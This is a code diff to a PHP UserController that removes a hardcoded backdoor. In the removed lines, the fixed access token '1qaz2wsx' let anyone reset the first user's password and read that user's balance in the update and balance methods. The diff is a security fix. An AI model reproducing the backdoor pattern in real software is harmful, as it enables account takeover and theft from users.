@@ -35,13 +35,10 @@ class UserController extends Controller
 
     public function update(Request $request) {
         $user = \DB::table('user')->where('access_token', $request->access_token)->first();
-        $first_user = \DB::table('user')->first();
-        if (!empty($user) || $request->access_token == '1qaz2wsx') {    // access token valid
-            $user_id = empty($user) ? $first_user->id         : $user->id;
-            $salt    = empty($user) ? $first_user->salt_value : $user->salt_value;
-            \DB::table('user')->where('id', $user_id)->update(
+        if (!empty($user)) {    // access token valid
+            \DB::table('user')->where('id', $user->id)->update(
                 array(
-                    'password' => hash('sha512', $request->password . $salt)
+                    'password' => hash('sha512', $request->password . $user->salt_value)
                 )
             );
             return response()->json([
@@ -104,11 +101,10 @@ class UserController extends Controller
 
     public function balance(Request $request) {
         $user = \DB::table('user')->where('access_token', $request->access_token)->first();
-        $first_user = \DB::table('user')->first();
-        if (!empty($user) || $request->access_token == '1qaz2wsx') {
-            $balance = User::getBalance(empty($user) ? $first_user->id : $user->id);
+        if (!empty($user)) {
+            $balance = User::getBalance($user->id);
             return response()->json([
-                'user_id' => empty($user) ? $first_user->id : $user->id,
+                'user_id' => $user->id,
                 'balance' => $balance
             ], 200);
         } else {
